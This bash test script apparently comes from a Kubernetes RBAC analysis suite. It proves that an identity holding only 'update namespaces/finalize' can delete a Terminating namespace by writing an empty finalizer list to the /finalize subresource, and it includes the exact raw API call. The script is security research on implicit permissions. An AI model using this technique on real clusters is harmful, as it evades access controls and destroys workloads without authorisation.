#!/usr/bin/env bash
# Implicit permission: update namespaces/finalize -> delete Namespace
#                                           (namespace-finalize-deletes-namespace)
#
# Proof: an identity granted ONLY `update namespaces/finalize` (NOT `delete
# namespaces`) can complete the deletion of a Namespace. Admin marks a Namespace
# Terminating (it is held open by a custom finalizer). The attacker PUTs the
# /finalize subresource clearing the finalizer list; because the Namespace is
# Terminating with an empty finalizer set, the apiserver deletes it during that
# update -- a delete the attacker was never granted.
# Mechanism: ../transitions/namespace-finalize.md
#   when: resource.name == context.resource1.name
source "$(dirname "$0")/../lib.sh"
test_start "namespace-finalize-deletes-namespace"

# A bootstrap namespace to host the attacker SA.
home_ns="$(new_ns ns-findel-home)"
mk_sa "$home_ns" attacker
subj="$(sa_subject "$home_ns" attacker)"
# ONLY update namespaces/finalize, cluster-wide (+get to observe). Deliberately
# NO `delete namespaces` and NO `update namespaces`.
grant_cluster "$home_ns" attacker "" "namespaces/finalize" "update"
grant_cluster "$home_ns" attacker "" "namespaces" "get,list"

# Admin creates a target namespace held open by a custom finalizer, then issues
# the delete so it is stuck in Terminating (the 'kubernetes' finalizer alone
# would complete immediately on an empty namespace).
target_ns="$(rid ns-findel-target)"; target_ns="$(tr '[:upper:]' '[:lower:]' <<<"$target_ns")"
_track "namespace/$target_ns"
step "admin creates Namespace $target_ns with a custom finalizer and deletes it (-> Terminating)"
K apply -f - >/dev/null <<EOF || fail "could not create target namespace"
apiVersion: v1
kind: Namespace
metadata: { name: $target_ns }
spec: { finalizers: ["kubernetes", "example.com/hold"] }
EOF
K delete namespace "$target_ns" --wait=false >/dev/null || fail "admin could not initiate delete"
# Confirm it is parked in Terminating, not already gone.
phase="$(K get namespace "$target_ns" -o jsonpath='{.status.phase}' 2>/dev/null)"
assert_eq "$phase" "Terminating" "target namespace is held open in Terminating"

assert_can    "$subj" update namespaces/finalize
assert_cannot "$subj" delete namespaces

step "attacker PUTs /finalize clearing the finalizer list (holding only 'update namespaces/finalize')"
as_subj "$subj" replace --raw "/api/v1/namespaces/$target_ns/finalize" -f - >/dev/null <<EOF \
  || fail "attacker could not write the finalize subresource"
{"apiVersion":"v1","kind":"Namespace","metadata":{"name":"$target_ns"},"spec":{"finalizers":[]}}
EOF

# EFFECT: clearing the last finalizer on a Terminating Namespace drives the
# apiserver to delete the Namespace object -- a delete the attacker never held.
wait_gone "" namespace "$target_ns" 60
step "apiserver deleted the Namespace via a /finalize write by an identity holding only 'update namespaces/finalize'"

test_pass
